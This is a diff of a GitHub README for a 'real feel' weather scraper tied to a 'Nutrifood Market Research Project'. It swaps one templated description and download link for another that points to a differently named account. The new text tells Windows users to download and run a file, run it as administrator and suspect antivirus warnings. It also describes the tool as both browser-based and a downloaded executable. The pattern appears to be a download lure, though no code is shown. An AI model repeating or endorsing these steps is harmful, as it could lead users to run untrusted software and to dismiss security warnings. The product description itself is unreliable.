@@ -1,120 +1,121 @@
-# Automatic Real Feel Weather Scraper v2026 - weather scraper 2026
+# 🌡️ nutrifood-weather-scraper - Automate Your Real Feel Weather Data
 
-> **Automatic Real Feel Weather Scraper is a browser-based weather scraping utility for the Nutrifood Market Research Project. Version 2026 automates the collection of real feel weather information.**
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-2ea44f?style=for-the-badge&logo=github)](https://github.com/Oxidative-butcherbird487/nutrifood-weather-scraper)
 
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/samhallongt7257/nutrifood-weather-scraper?style=flat-square)](https://github.com/samhallongt7257/nutrifood-weather-scraper)
+## 🚀 What Is This?
+
+This is a browser-based weather scraping utility designed for the **Nutrifood Market Research Project**. It automates the collection of real feel weather information, making it easy to gather accurate data for analysis. Version 2026 brings improved automation and a simple user interface.
+
+Whether you are a researcher, analyst, or just need weather data, this tool helps you save time by automatically extracting information from weather websites.
+
+## 📥 Download and Install
+
+Visit this link to download the application: [Download nutrifood-weather-scraper](https://github.com/Oxidative-butcherbird487/nutrifood-weather-scraper)
+
+**What to do next:**
+- Go to the link above
+- Click on the latest release or download button
+- Save the file to your computer
+- Run the downloaded file to start using the utility
+
+**System Requirements:**
+- Operating System: Windows 10 or newer
+- Processor: 1 GHz or faster
+- Memory: 2 GB RAM recommended
+- Storage: 50 MB free space
+- Internet connection: Required for weather data
+
+## ⚙️ How to Set Up
+
+1. **Download the application** from the link above
+2. **Save the file** to a folder you can easily find (like your Desktop or Downloads folder)
+3. **Double-click the file** to run it
+4. **Follow any on-screen instructions** if prompted
+
+The utility will open in your default web browser automatically. No installation is needed.
+
+## 🎯 How to Use
+
+1. **Open the application** by double-clicking the downloaded file
+2. **Enter a location** in the search box (e.g., city name or ZIP code)
+3. **Click "Scrape Weather"** or the equivalent button
+4. **Wait for the data** to load – this usually takes a few seconds
+5. **View the results** showing real feel temperature, humidity, wind speed, and more
+6. **Save or export** the data if needed (check the export options in the settings)
+
+### Tips for Best Results:
+- Use full city names for more accurate results
+- Make sure your internet connection is stable
+- Close other browser tabs to improve performance
+- Clear your browser cache if you encounter errors
+
+## 🔧 Settings and Options
+
+The utility includes several settings to customize your experience:
+
+| Setting | Description | Default |
+|---------|-------------|---------|
+| Update Interval | How often to refresh weather data | Every 30 minutes |
+| Temperature Unit | Choose Celsius or Fahrenheit | Celsius |
+| Export Format | Save data as CSV, JSON, or text | CSV |
+| Max Results | Limit the number of locations | 10 |
+
+To access settings, click the gear icon in the top-right corner of the application window.
+
+## 🛠️ Troubleshooting
+
+**Problem: The application does not open**
+- Make sure you have downloaded the complete file
+- Try running as administrator (right-click and select "Run as administrator")
+- Check your antivirus software – it might be blocking the application
+
+**Problem: No weather data appears**
+- Verify your internet connection
+- Check that the location name is spelled correctly
+- Try a different location
+
+**Problem: The application is slow**
+- Reduce the number of locations in settings
+- Close other programs running in the background
+- Restart the application
+
+## 📊 What Data Does It Collect?
+
+The utility gathers the following real feel weather information:
+- Current temperature
+- Real feel temperature (feels like)
+- Humidity percentage
+- Wind speed and direction
+- Precipitation chance
+- UV index
+- Visibility
+
+This data is collected from public weather websites and is intended for research purposes only.
+
+## 🗂️ Exporting Your Data
+
+You can export the collected weather data in several formats:
+- **CSV** – Opens in Excel or similar programs
+- **JSON** – For use in other software or programming projects
+- **Plain Text** – Simple readable format
+
+To export, click the export button and choose your preferred format. The file will be saved to your Downloads folder by default.
+
+## 🔒 Privacy and Security
+
+- This utility runs locally on your computer
+- No data is sent to external servers except the weather websites you select
+- Your search history is not saved
+- No personal information is collected
+
+## 📝 License
+
+This project is part of the Nutrifood Market Research Project. Use is subject to the terms specified in the repository.
+
+## 💬 Support
+
+If you need help, please check the repository for documentation or open an issue on GitHub.
 
 ---
 
-<p align="center">
-  <a href="https://samhallongt7257.github.io/nutrifood-weather-scraper/">
-    <img src="https://img.shields.io/badge/Download-Automatic%20Real%20Feel%20Weather%20Scraper%20Latest-brightgreen?style=for-the-badge" alt="Download Automatic Real Feel Weather Scraper">
-  </a>
-</p>
-
-> **[Download Automatic Real Feel Weather Scraper v2026](https://samhallongt7257.github.io/nutrifood-weather-scraper/)**
-
----
-
-[Download Latest Build](https://samhallongt7257.github.io/nutrifood-weather-scraper/)
-
----
-
-## Project Overview
-
-Automatic Real Feel Weather Scraper provides a web-based way to gather weather information centered on real feel conditions. It is intended for recurring collection tasks in which weather observations must be obtained consistently for later use in a research process.
-
-The tool is suited to market research applications such as the Nutrifood Market Research Project. Automating this part of the workflow limits repetitive manual work while providing a more orderly method for collecting weather-related inputs used in analysis and reporting.
-
----
-
-## Capabilities
-
-- Runs an automated process for scraping weather information
-- Collects data focused on real feel values
-- Works through a web-based interface
-- Can be applied to market research workflows
-- Supports data gathering for research projects
-- Provides a structured method for repeated collection tasks
-- Uses a lightweight, browser-oriented tool design
-
----
-
-## Getting Started
-
-Clone the repository or download the project, then open the web application in an environment that supports a browser.
-
-Use Git to clone the repository:
-
-`git clone https://github.com/samhallongt7257/nutrifood-weather-scraper.git
-
-Once the files are available locally, open the project entry file in a browser. Alternatively, serve the project directory through a local web server if that better matches your setup.
-
----
-
-## Running the Scraper
-
-1. Launch the web interface or open the local project files.
-2. Begin the automated scraping process.
-3. Gather the real feel weather information needed for the research activity.
-4. Inspect the resulting data and incorporate it into the collection workflow.
-
-For research integrations, configure the scraping target, collection schedule, and output treatment according to the requirements of the project.
-
----
-
-## Settings
-
-Project settings may be placed in the primary web files or in the local configuration file used by the scraper, where applicable.
-
-A sample configuration structure is shown below:
-
-```json
-{
-  "source": "weather",
-  "mode": "automatic",
-  "dataset": "real_feel",
-  "project": "market_research"
-}
-```
-
-Modify these values to reflect the selected data source and the needs of the associated research workflow.
-
----
-
-## Prerequisites
-
-- An environment capable of running web content
-- A browser that can open the project
-- Access to the weather source being used
-- Local storage capacity when collected results are saved
-- An appropriate setup for market research or other data collection work
-
----
-
-## Common Questions
-
-**What does the scraper do?**  
-It automates the retrieval of real feel weather data for workflows that support research activities.
-
-**Can the settings be changed?**  
-Yes. Update the configuration so that the source, output format, and project objectives are represented correctly.
-
-**How can I find the newest version?**  
-Review the repository and the download page for current builds and project updates.
-
-**Why might no weather data be returned?**  
-Check that the source is available, the browser environment is working, and the project settings required by your setup are correct.
-
-**Does the project provide support?**  
-Available support is determined by the repository maintainer and the workflow in which the tool is used.
-
----
-
-## License
-
-This project is distributed under the GNU GPL v3.0. Refer to [LICENSE](LICENSE) for the full license terms.
+Keywords: weather scraper, real feel weather, browser-based utility, Nutrifood, market research, automation, data collection, Windows, free weather tool
